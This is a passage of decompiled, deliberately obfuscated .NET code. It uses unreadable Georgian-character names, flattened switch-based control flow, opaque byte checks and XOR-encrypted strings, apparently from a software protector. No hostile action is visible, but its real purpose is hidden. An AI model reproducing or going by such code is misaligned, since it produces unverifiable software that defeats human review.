            Ⴗ.Ⴐ.Ⴅ();
            num1 = 15;
            continue;
          case 2:
          case 38:
            goto label_14;
          case 3:
            goto label_29;
          case 4:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 0;
            continue;
          case 5:
            goto label_34;
          case 6:
            num1 = numArray[index] < (byte) 13 ? 19 : 28;
            continue;
          case 7:
            Ⴗ.Ⴗ.Ⴐ();
            num1 = 10;
            continue;
          case 8:
            int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
            num1 = 27;
            continue;
          case 9:
            goto label_4;
          case 10:
            ++index;
            goto case 31;
          case 11:
            ++index;
            num1 = 16;
            continue;
          case 12:
            Ⴗ.Ⴗ.Ⴈ();
            num1 = 22;
            continue;
          case 13:
            num1 = (byte) 224 == numArray[index] ? 22 : 12;
            continue;
          case 14:
          case 26:
            goto label_9;
          case 15:
            ++index;
            num1 = 35;
            continue;
          case 16:
            num1 = numArray[index] < (byte) 79 ? 3 : 32;
            continue;
          case 17:
            num1 = numArray[index] < (byte) 8 ? 9 : 25;
            continue;
          case 18:
            Ⴗ.Ⴗ.Ⴐ();
            num1 = 39;
            continue;
          case 19:
            goto label_19;
          case 20:
            num1 = numArray[index] < (byte) 206 ? 14 : 34;
            continue;
          case 21:
            goto label_3;
          case 22:
            ++index;
            num1 = 6;
            continue;
          case 23:
            int num3 = (int) Ⴗ.Ⴗ.Ⴄ();
            num1 = 43;
            continue;
          case 24:
            goto label_40;
          case 25:
            num1 = (byte) 8 == numArray[index] ? 0 : 4;
            continue;
          case 27:
            ++index;
            num1 = 42;
            continue;
          case 28:
            num1 = (byte) 13 == numArray[index] ? 27 : 8;
            continue;
          case 29:
            num1 = (byte) 103 == numArray[index] ? 10 : 7;
            continue;
          case 30:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 11;
            continue;
          case 31:
            num1 = 41;
            continue;
          case 32:
            num1 = (byte) 79 == numArray[index] ? 15 : 1;
            continue;
          case 34:
            num1 = (byte) 206 == numArray[index] ? 43 : 23;
            continue;
          case 35:
            num1 = numArray[index] < (byte) 103 ? 5 : 29;
            continue;
          case 36:
            num1 = (byte) 186 == numArray[index] ? 11 : 30;
            continue;
          case 37:
            num1 = numArray[index] < (byte) 224 ? 2 : 13;
            continue;
          case 39:
            goto label_44;
          case 40:
            num1 = (byte) 66 == numArray[index] ? 39 : 18;
            continue;
          case 41:
            num1 = numArray[index] < (byte) 66 ? 24 : 40;
            continue;
          case 42:
            num1 = numArray[index] < (byte) 186 ? 44 : 36;
            continue;
          case 43:
            ++index;
            num1 = 37;
            continue;
          case 44:
            goto label_24;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႨ);
            num1 = 21;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴗ.ႨႨ();
      return 10;
label_9:
      return 9;
label_14:
      return 7;
label_19:
      return 8;
label_24:
      return 5;
label_29:
      return 7;
label_34:
      return 12;
label_40:
      return 8;
label_44:
      int num4 = index + 1;
      return 7;
    }

    internal static void ႭႭ()
    {
      switch (3)
      {
        case 0:
        case 1:
        case 2:
        case 4:
          Ⴗ.Ⴗ.ႨႠ();
          break;
        default:
          int index = 0;
          byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(76, 47), Ⴗ.Ⴗ.ႥႠ(1752227528), 625, 603);
label_5:
          while (numArray[index] >= (byte) 8)
          {
            int num1 = 4;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 6:
                  goto label_9;
                case 1:
                  goto label_8;
                case 2:
                case 5:
                  goto label_5;
                case 4:
                  num1 = (byte) 8 == numArray[index] ? 6 : 1;
                  continue;
                case 7:
                  goto label_10;
                default:
                  goto label_4;
              }
            }
label_10:
            return;
label_4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႭ);
            return;
label_8:
            Ⴗ.Ⴐ.Ⴐ();
label_9:
            int num2 = index + 1;
            return;
          }
          goto case 0;
      }
    }

    internal static object ႭႥ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(603, 575), Ⴗ.Ⴗ.ႥႠ(1752227528), 371, 344);
      int num1 = 11;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 5:
            num1 = numArray[index] < (byte) 206 ? 4 : 2;
            continue;
          case 2:
            num1 = (byte) 206 == numArray[index] ? 9 : 7;
            continue;
          case 3:
          case 11:
            num1 = numArray[index] < (byte) 8 ? 14 : 6;
            continue;
          case 4:
            goto label_9;
          case 6:
            num1 = (byte) 8 == numArray[index] ? 8 : 12;
            continue;
          case 7:
            goto label_12;
          case 8:
            ++index;
            num1 = 1;
            continue;
          case 9:
            goto label_13;
          case 10:
          case 14:
            goto label_4;
          case 12:
            Ⴗ.Ⴐ.Ⴅ();
            num1 = 8;
            continue;
          case 13:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႥ);
            num1 = 13;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႭႨ();
      return (object) null;
label_9:
      return (object) null;
label_12:
      Ⴗ.Ⴐ.Ⴀ();
label_13:
      int num2 = index + 1;
      return (object) null;
    }

    internal static byte ႭႰ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(172, 201), Ⴗ.Ⴗ.ႥႠ(1752227528), 600, 628);
label_4:
      int num1 = 18;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_3;
          case 1:
            ++index;
            num1 = 10;
            continue;
          case 2:
            ++index;
            num1 = 3;
            continue;
          case 3:
            num1 = numArray[index] < (byte) 13 ? 16 : 8;
            continue;
          case 4:
            goto label_5;
          case 5:
            goto label_4;
          case 6:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 1;
            continue;
          case 7:
          case 19:
            goto label_24;
          case 8:
            num1 = (byte) 13 == numArray[index] ? 19 : 23;
            continue;
          case 9:
            int num2 = (int) Ⴗ.Ⴗ.Ⴄ();
            num1 = 14;
            continue;
          case 10:
            num1 = numArray[index] < (byte) 206 ? 20 : 13;
            continue;
          case 11:
            goto label_15;
          case 12:
          case 18:
            num1 = numArray[index] < (byte) 8 ? 4 : 17;
            continue;
          case 13:
            num1 = (byte) 206 == numArray[index] ? 14 : 9;
            continue;
          case 14:
            ++index;
            num1 = 22;
            continue;
          case 16:
            goto label_20;
          case 17:
            num1 = (byte) 8 == numArray[index] ? 1 : 6;
            continue;
          case 20:
            goto label_10;
          case 21:
            num1 = (byte) 224 == numArray[index] ? 2 : 24;
            continue;
          case 22:
            num1 = numArray[index] < (byte) 224 ? 11 : 21;
            continue;
          case 23:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 19;
            continue;
          case 24:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႰ);
            num1 = 0;
            continue;
        }
      }
label_5:
      Ⴗ.Ⴐ.ႨႼ();
      return 4;
label_10:
      return 14;
label_15:
      return 3;
label_20:
      return 11;
label_24:
      int num3 = index + 1;
      return 1;
    }

    internal static object ႭႠ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(384, 486), Ⴗ.Ⴗ.ႥႠ(1752227528), 549, 520);
      int num1 = 12;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            num1 = (byte) 13 == numArray[index] ? 7 : 11;
            continue;
          case 2:
          case 10:
            goto label_4;
          case 3:
            ++index;
            num1 = 23;
            continue;
          case 5:
            num1 = (byte) 206 == numArray[index] ? 28 : 13;
            continue;
          case 6:
            num1 = (byte) 186 == numArray[index] ? 25 : 8;
            continue;
          case 7:
          case 22:
            ++index;
            num1 = 17;
            continue;
          case 8:
            int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
            num1 = 25;
            continue;
          case 9:
            num1 = (byte) 224 == numArray[index] ? 19 : 27;
            continue;
          case 11:
            Ⴗ.Ⴗ.Ⴈ();
            num1 = 7;
            continue;
          case 12:
            num1 = numArray[index] < (byte) 8 ? 10 : 15;
            continue;
          case 13:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 28;
            continue;
          case 14:
            goto label_9;
          case 15:
            num1 = (byte) 8 == numArray[index] ? 3 : 29;
            continue;
          case 16:
            num1 = numArray[index] < (byte) 13 ? 21 : 0;
            continue;
          case 17:
            num1 = numArray[index] < (byte) 186 ? 20 : 6;
            continue;
          case 18:
            num1 = numArray[index] < (byte) 224 ? 24 : 9;
            continue;
          case 19:
            ++index;
            num1 = 16;
            continue;
          case 20:
            goto label_24;
          case 21:
            goto label_19;
          case 23:
            num1 = numArray[index] < (byte) 206 ? 14 : 5;
            continue;
          case 24:
            goto label_14;
          case 25:
            goto label_28;
          case 26:
            goto label_3;
          case 27:
            Ⴗ.Ⴐ.Ⴜ();
            num1 = 19;
            continue;
          case 28:
            ++index;
            num1 = 18;
            continue;
          case 29:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႠ);
            num1 = 26;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႭႤ();
      return (object) null;
label_9:
      return (object) null;
label_14:
      return (object) null;
label_19:
      return (object) null;
label_24:
      return (object) null;
label_28:
      int num3 = index + 1;
      return (object) null;
    }

    internal static object ႭႣ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(657, 758), Ⴗ.Ⴗ.ႥႠ(1752227528), 283, 309);
      int num1 = 12;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = numArray[index] < (byte) 206 ? 30 : 11;
            continue;
          case 1:
          case 19:
          case 22:
            ++index;
            num1 = 0;
            continue;
          case 2:
            num1 = numArray[index] < (byte) 79 ? 9 : 26;
            continue;
          case 3:
            num1 = numArray[index] < (byte) 13 ? 24 : 5;
            continue;
          case 4:
            num1 = (byte) 8 == numArray[index] ? 1 : 7;
            continue;
          case 5:
            num1 = (byte) 13 == numArray[index] ? 21 : 18;
            continue;
          case 6:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 15;
            continue;
          case 7:
            Ⴗ.Ⴐ.Ⴐ();
            goto case 1;
          case 8:
            num1 = numArray[index] < (byte) 224 ? 16 : 27;
            continue;
          case 9:
            goto label_29;
          case 10:
            goto label_24;
          case 11:
            num1 = (byte) 206 == numArray[index] ? 31 : 28;
            continue;
          case 12:
            num1 = numArray[index] < (byte) 8 ? 32 : 4;
            continue;
          case 13:
            num1 = numArray[index] < (byte) 186 ? 10 : 29;
            continue;
          case 14:
            goto label_33;
          case 15:
            ++index;
            num1 = 3;
            continue;
          case 16:
          case 17:
            goto label_14;
          case 18:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 21;
            continue;
          case 21:
            ++index;
            num1 = 13;
            continue;
          case 23:
            goto label_3;
          case 24:
            goto label_19;
          case 25:
            goto label_32;
          case 26:
            num1 = (byte) 79 == numArray[index] ? 14 : 25;
            continue;
          case 27:
            num1 = (byte) 224 == numArray[index] ? 15 : 6;
            continue;
          case 28:
            Ⴗ.Ⴐ.Ⴅ();
            num1 = 31;
            continue;
          case 29:
            num1 = (byte) 186 == numArray[index] ? 34 : 33;
            continue;
          case 30:
            goto label_9;
          case 31:
            ++index;
            num1 = 8;
            continue;
          case 32:
            goto label_4;
          case 33:
            Ⴗ.Ⴐ.Ⴀ();
            goto case 34;
          case 34:
            ++index;
            num1 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႣ);
            num1 = 23;
            continue;
        }
      }
label_4:
      int num2 = (int) Ⴗ.Ⴐ.ႭႰ();
      return (object) null;
label_9:
      return (object) null;
label_14:
      return (object) null;
label_19:
      return (object) null;
label_24:
      return (object) null;
label_29:
      return (object) null;
label_32:
      Ⴗ.Ⴐ.Ⴓ();
label_33:
      int num3 = index + 1;
      return (object) null;
    }

    internal static int ႭႳ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(451, 427), Ⴗ.Ⴗ.ႥႠ(1752227528), 276, 315);
      int num1 = 6;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 224 == numArray[index] ? 39 : 28;
            continue;
          case 1:
            num1 = numArray[index] < (byte) 103 ? 23 : 7;
            continue;
          case 2:
            goto label_3;
          case 3:
          case 38:
            Ⴗ.Ⴐ.Ⴅ();
            num1 = 31;
            continue;
          case 4:
            goto label_14;
          case 5:
            goto label_38;
          case 6:
            num1 = numArray[index] < (byte) 8 ? 9 : 13;
            continue;
          case 7:
            num1 = (byte) 103 == numArray[index] ? 5 : 19;
            continue;
          case 8:
            ++index;
            num1 = 30;
            continue;
          case 9:
            goto label_4;
          case 10:
            num1 = (byte) 186 == numArray[index] ? 14 : 35;
            continue;
          case 11:
            num1 = numArray[index] < (byte) 206 ? 34 : 12;
            continue;
          case 12:
            num1 = (byte) 206 == numArray[index] ? 8 : 25;
            continue;
          case 13:
          case 37:
            num1 = (byte) 8 == numArray[index] ? 33 : 15;
            continue;
          case 14:
            ++index;
            num1 = 26;
            continue;
          case 15:
            Ⴗ.Ⴐ.Ⴅ();
            num1 = 33;
            continue;
          case 16:
            goto label_24;
          case 17:
            num1 = (byte) 79 == numArray[index] ? 31 : 38;
            continue;
          case 18:
            num1 = numArray[index] < (byte) 186 ? 16 : 10;
            continue;
          case 19:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 5;
            continue;
          case 20:
          case 27:
            goto label_19;
          case 21:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 22;
            continue;
          case 22:
            ++index;
            num1 = 18;
            continue;
          case 23:
            goto label_34;
          case 25:
            Ⴗ.Ⴐ.Ⴓ();
            goto case 8;
          case 26:
            num1 = numArray[index] < (byte) 79 ? 29 : 17;
            continue;
          case 28:
            int num2 = (int) Ⴗ.Ⴗ.Ⴄ();
            num1 = 39;
            continue;
          case 29:
            goto label_29;
          case 30:
            num1 = numArray[index] < (byte) 224 ? 4 : 0;
            continue;
          case 31:
            ++index;
            num1 = 1;
            continue;
          case 32:
            num1 = numArray[index] < (byte) 13 ? 27 : 36;
            continue;
          case 33:
            ++index;
            num1 = 11;
            continue;
          case 34:
            goto label_9;
          case 35:
            Ⴗ.Ⴐ.Ⴐ();
            goto case 14;
          case 36:
            num1 = (byte) 13 == numArray[index] ? 22 : 21;
            continue;
          case 39:
            ++index;
            num1 = 32;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႳ);
            num1 = 2;
            continue;
        }
      }
label_4:
      int num3 = (int) Ⴗ.Ⴐ.ႨႥ();
      return 2;
label_9:
      return 15;
label_14:
      return 0;
label_19:
      return 12;
label_24:
      return 4;
label_29:
      return 9;
label_34:
      return 13;
label_38:
      int num4 = index + 1;
      return 11;
    }

    internal static void ႭႷ()
    {
      int index;
      byte[] numArray;
      switch (1)
      {
        case 0:
          Ⴗ.Ⴐ.ႭႳ();
          break;
        case 2:
        case 4:
          numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(704, 681), Ⴗ.Ⴗ.ႥႠ(1752227528), 240, 192);
          goto case 3;
        case 3:
label_7:
          while (numArray[index] >= (byte) 8)
          {
            int num1 = 20;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_27;
                case 1:
                  goto label_12;
                case 2:
                  num1 = numArray[index] < (byte) 186 ? 8 : 40;
                  continue;
                case 3:
                case 9:
                  num1 = (byte) 224 == numArray[index] ? 36 : 21;
                  continue;
                case 4:
                  goto label_7;
                case 5:
                  goto label_32;
                case 6:
                  goto label_45;
                case 7:
                  num1 = numArray[index] < (byte) 224 ? 1 : 3;
                  continue;
                case 8:
                  goto label_22;
                case 10:
                  Ⴗ.Ⴗ.Ⴐ();
                  num1 = 22;
                  continue;
                case 12:
                  ++index;
                  num1 = 27;
                  continue;
                case 13:
                  goto label_37;
                case 14:
                  num1 = (byte) 206 == numArray[index] ? 22 : 10;
                  continue;
                case 15:
                  ++index;
                  num1 = 17;
                  continue;
                case 16:
                  Ⴗ.Ⴗ.Ⴃ();
                  num1 = 12;
                  continue;
                case 17:
                  num1 = numArray[index] < (byte) 66 ? 13 : 38;
                  continue;
                case 18:
                  num1 = numArray[index] < (byte) 13 ? 34 : 19;
                  continue;
                case 19:
                  num1 = (byte) 13 == numArray[index] ? 42 : 29;
                  continue;
                case 20:
                  num1 = (byte) 8 == numArray[index] ? 26 : 28;
                  continue;
                case 21:
                  Ⴗ.Ⴗ.Ⴀ();
                  num1 = 36;
                  continue;
                case 22:
                  ++index;
                  num1 = 7;
                  continue;
                case 23:
                  Ⴗ.Ⴗ.Ⴃ();
                  num1 = 15;
                  continue;
                case 24:
                case 33:
                  num1 = numArray[index] < (byte) 79 ? 0 : 32;
                  continue;
                case 25:
                  num1 = numArray[index] < (byte) 206 ? 31 : 14;
                  continue;
                case 26:
                  ++index;
                  num1 = 25;
                  continue;
                case 27:
                  num1 = numArray[index] < (byte) 103 ? 5 : 30;
                  continue;
                case 28:
                  Ⴗ.Ⴐ.Ⴐ();
                  goto case 26;
                case 29:
                  int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
                  num1 = 42;
                  continue;
                case 30:
                  num1 = (byte) 103 == numArray[index] ? 15 : 23;
                  continue;
                case 31:
                  goto label_3;
                case 32:
                  num1 = (byte) 79 == numArray[index] ? 12 : 16;
                  continue;
                case 34:
                  goto label_17;
                case 35:
                  ++index;
                  num1 = 24;
                  continue;
                case 36:
                  ++index;
                  num1 = 18;
                  continue;
                case 37:
                  Ⴗ.Ⴐ.Ⴓ();
                  goto case 35;
                case 38:
                  num1 = (byte) 66 == numArray[index] ? 6 : 39;
                  continue;
                case 39:
                  Ⴗ.Ⴐ.Ⴜ();
                  num1 = 6;
                  continue;
                case 40:
                case 41:
                  num1 = (byte) 186 == numArray[index] ? 35 : 37;
                  continue;
                case 42:
                  ++index;
                  num1 = 2;
                  continue;
                default:
                  goto label_6;
              }
            }
label_27:
            return;
label_12:
            return;
label_32:
            return;
label_22:
            return;
label_37:
            return;
label_3:
            return;
label_17:
            return;
label_6:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႷ);
            return;
label_45:
            int num3 = index + 1;
            return;
          }
          goto case 0;
        default:
          index = 0;
          goto case 2;
      }
    }

    internal static long ႭႼ()
    {
label_3:
      int index = 0;
label_4:
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(873, 771), Ⴗ.Ⴗ.ႥႠ(1752227528), 348, 365);
      int num1 = 8;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 8 == numArray[index] ? 3 : 5;
            continue;
          case 1:
          case 5:
          case 9:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 3;
            continue;
          case 3:
            goto label_9;
          case 4:
            goto label_3;
          case 6:
            goto label_4;
          case 7:
            goto label_5;
          case 8:
            num1 = numArray[index] < (byte) 8 ? 7 : 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႼ);
            num1 = 4;
            continue;
        }
      }
label_5:
      Ⴗ.Ⴐ.ႨႭ();
      return 15;
label_9:
      int num2 = index + 1;
      return 11;
    }

    internal static int ႥႤ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(972, 935), Ⴗ.Ⴗ.ႥႠ(1752227528), 110, 92);
      int num1 = 8;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 8 == numArray[index] ? 6 : 13;
            continue;
          case 1:
          case 6:
            ++index;
            num1 = 11;
            continue;
          case 3:
            goto label_4;
          case 4:
            num1 = (byte) 206 == numArray[index] ? 5 : 14;
            continue;
          case 5:
          case 10:
            goto label_13;
          case 7:
            goto label_9;
          case 8:
            num1 = numArray[index] < (byte) 8 ? 3 : 0;
            continue;
          case 9:
            goto label_3;
          case 11:
          case 12:
            num1 = numArray[index] < (byte) 206 ? 7 : 4;
            continue;
          case 13:
            Ⴗ.Ⴗ.Ⴐ();
            num1 = 6;
            continue;
          case 14:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႥႤ);
            num1 = 9;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴗ.ႨႥ();
      return 2;
label_9:
      return 7;
label_13:
      int num2 = index + 1;
      return 12;
    }

    internal static void ႥႨ()
    {
      int index;
      switch (1)
      {
        case 0:
        case 4:
          Ⴗ.Ⴗ.ႨႥ();
          break;
        case 2:
        case 3:
          byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(263, 363), Ⴗ.Ⴗ.ႥႠ(1752227528), 857, 874);
label_6:
          while (numArray[index] >= (byte) 8)
          {
            int num1 = 7;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_16;
                case 1:
                  ++index;
                  num1 = 11;
                  continue;
                case 2:
                  goto label_6;
                case 3:
                  goto label_29;
                case 5:
                  ++index;
                  num1 = 22;
                  continue;
                case 6:
                  ++index;
                  num1 = 15;
                  continue;
                case 7:
                  num1 = (byte) 8 == numArray[index] ? 6 : 25;
                  continue;
                case 8:
                  num1 = (byte) 186 == numArray[index] ? 3 : 18;
                  continue;
                case 9:
                  num1 = (byte) 224 == numArray[index] ? 16 : 17;
                  continue;
                case 10:
                  num1 = (byte) 206 == numArray[index] ? 5 : 20;
                  continue;
                case 11:
                  num1 = numArray[index] < (byte) 186 ? 24 : 8;
                  continue;
                case 12:
                case 14:
                case 16:
                  ++index;
                  num1 = 21;
                  continue;
                case 13:
                  goto label_11;
                case 15:
                  num1 = numArray[index] < (byte) 206 ? 23 : 10;
                  continue;
                case 17:
                  Ⴗ.Ⴗ.Ⴃ();
                  num1 = 16;
                  continue;
                case 18:
                  Ⴗ.Ⴗ.Ⴍ();
                  num1 = 3;
                  continue;
                case 19:
                case 21:
                  num1 = numArray[index] < (byte) 13 ? 0 : 26;
                  continue;
                case 20:
                  Ⴗ.Ⴐ.Ⴅ();
                  num1 = 5;
                  continue;
                case 22:
                  num1 = numArray[index] < (byte) 224 ? 13 : 9;
                  continue;
                case 23:
                  goto label_30;
                case 24:
                  goto label_21;
                case 25:
                  Ⴗ.Ⴗ.Ⴅ();
                  num1 = 6;
                  continue;
                case 26:
                  num1 = (byte) 13 == numArray[index] ? 1 : 27;
                  continue;
                case 27:
                  Ⴗ.Ⴗ.Ⴅ();
                  num1 = 1;
                  continue;
                default:
                  goto label_5;
              }
            }
label_16:
            return;
label_11:
            return;
label_30:
            return;
label_21:
            return;
label_5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႥႨ);
            return;
label_29:
            int num2 = index + 1;
            return;
          }
          goto case 0;
        default:
          index = 0;
          goto case 2;
      }
    }

    internal static void ႥႭ()
    {
      int index;
      byte[] numArray;
      switch (1)
      {
        case 0:
          Ⴗ.Ⴗ.Ⴗ();
          break;
        case 3:
          break;
        case 4:
label_7:
          while (numArray[index] >= (byte) 8)
          {
            int num1 = 22;
            while (true)
            {
              switch (num1)
              {
                case 1:
                  Ⴗ.Ⴐ.Ⴓ();
                  goto case 32;
                case 2:
                  goto label_27;
                case 3:
                  ++index;
                  num1 = 34;
                  continue;
                case 4:
                  int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
                  num1 = 9;
                  continue;
                case 5:
                  goto label_7;
                case 6:
                  goto label_17;
                case 7:
                  num1 = (byte) 224 == numArray[index] ? 37 : 26;
                  continue;
                case 8:
                  goto label_4;
                case 9:
                  ++index;
                  num1 = 18;
                  continue;
                case 10:
                  Ⴗ.Ⴐ.Ⴓ();
                  goto case 25;
                case 11:
                  goto label_41;
                case 12:
                  num1 = (byte) 103 == numArray[index] ? 24 : 17;
                  continue;
                case 13:
                  goto label_22;
                case 14:
                  num1 = (byte) 79 == numArray[index] ? 9 : 4;
                  continue;
                case 15:
                  num1 = numArray[index] < (byte) 224 ? 21 : 7;
                  continue;
                case 16:
                case 30:
                  Ⴗ.Ⴗ.Ⴃ();
                  num1 = 3;
                  continue;
                case 17:
                  Ⴗ.Ⴗ.Ⴀ();
                  num1 = 24;
                  continue;
                case 18:
                  num1 = numArray[index] < (byte) 103 ? 36 : 12;
                  continue;
                case 19:
                  num1 = (byte) 13 == numArray[index] ? 28 : 31;
                  continue;
                case 20:
                  num1 = numArray[index] < (byte) 206 ? 8 : 33;
                  continue;
                case 21:
                  goto label_12;
                case 22:
                  num1 = (byte) 8 == numArray[index] ? 25 : 10;
                  continue;
                case 23:
                  goto label_32;
                case 24:
                  goto label_40;
                case 25:
                  ++index;
                  num1 = 20;
                  continue;
                case 26:
                  int num3 = (int) Ⴗ.Ⴗ.Ⴄ();
                  num1 = 37;
                  continue;
                case 27:
                  num1 = numArray[index] < (byte) 13 ? 6 : 19;
                  continue;
                case 28:
                  ++index;
                  num1 = 29;
                  continue;
                case 29:
                  num1 = numArray[index] < (byte) 186 ? 13 : 35;
                  continue;
                case 31:
                  Ⴗ.Ⴗ.Ⴃ();
                  num1 = 28;
                  continue;
                case 32:
                  ++index;
                  num1 = 15;
                  continue;
                case 33:
                  num1 = (byte) 206 == numArray[index] ? 32 : 1;
                  continue;
                case 34:
                  num1 = numArray[index] < (byte) 79 ? 2 : 14;
                  continue;
                case 35:
                  num1 = (byte) 186 == numArray[index] ? 3 : 16;
                  continue;
                case 36:
                  goto label_42;
                case 37:
                  ++index;
                  num1 = 27;
                  continue;
                default:
                  goto label_6;
              }
            }
label_27:
            return;
label_17:
            return;
label_4:
            return;
label_41:
            return;
label_22:
            return;
label_12:
            return;
label_32:
            return;
label_42:
            return;
label_6:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႥႭ);
            return;
label_40:
            int num4 = index + 1;
            return;
          }
          goto case 0;
        default:
          index = 0;
          numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(251, 150), Ⴗ.Ⴗ.ႥႠ(1752227528), 1017, 973);
          goto case 4;
      }
    }

    internal static string ႥႥ([In] int obj0)
    {
label_3:
      int index1 = obj0 ^ 1752227528;
      string str1;
      int num1 = (str1 = Ⴗ.Ⴐ.ႥႠ[index1]) == null ? 12 : 18;
      while (true)
      {
        string str2;
        int num2;
        char[] chArray;
        char[] ⴅⴐ;
        int length;
        int index2;
        string str3;
        switch (num1)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (string.\u002Ector);
            num1 = 4;
            continue;
          case 2:
          case 20:
            num1 = index2 < num2 ? 9 : 14;
            continue;
          case 3:
            str3 = "༑ᤥ㝎⩋㼟\u00AD";
            break;
          case 4:
            goto label_30;
          case 5:
          case 16:
            str3 = "㰘ᓎ༓ᤥ㝏";
            break;
          case 6:
            index2 = 1 + index2;
            num1 = 2;
            continue;
          case 7:
            str3 = "ᓑ༈\u192C㝙⩜㼛¨㰑";
            break;
          case 8:
            str3 = "⩽㼖¨㰇ᓇ༨\u192E㝊⩁㼕¬㰇";
            break;
          case 9:
            chArray[index2] = (char) ((uint) Ⴗ.Ⴐ.ႰႳ(str2, index2, 674, 687) ^ (uint) ⴅⴐ[(index2 + obj0) % length]);
            num1 = 6;
            continue;
          case 11:
            str3 = (string) null;
            break;
          case 12:
            int num3;
            switch (index1)
            {
              case 0:
                num3 = 5;
                break;
              case 1:
                num3 = 7;
                break;
              case 2:
                num3 = 3;
                break;
              case 3:
                num3 = 21;
                break;
              case 4:
                num3 = 17;
                break;
              case 5:
                num3 = 8;
                break;
              case 6:
                num3 = 13;
                break;
              default:
                num3 = 11;
                break;
            }
            num1 = num3;
            continue;
          case 13:
            str3 = "㽈û㱂ᓳ༥\u1976㜋⨝㽉þ㱀ᓶ༧ᤅ㜍⨚㼻ð㱆ᓶབྷᥳ㜌⨖㽉\u008A㱀ᓴབྷᤂ㝹⨛㼽\u008B㱅ᓵདᤅ㝽⩨";
            break;
          case 14:
            str1 = new string(chArray);
            Ⴗ.Ⴐ.ႥႠ[index1] = str1;
            num1 = 4;
            continue;
          case 15:
            index2 = 0;
            num1 = 2;
            continue;
          case 17:
            str3 = "㝯⩆㼟»㰅ᓁ༕ᤷ㝓";
            break;
          case 18:
            goto label_4;
          case 19:
            goto label_3;
          case 21:
            str3 = "\u192D㝅⩝㼖 㰁ᓃ༘ᤫ㝙⩗";
            break;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴗ.Ⴐ.ႥႥ);
            num1 = 19;
            continue;
        }
        str2 = str3;
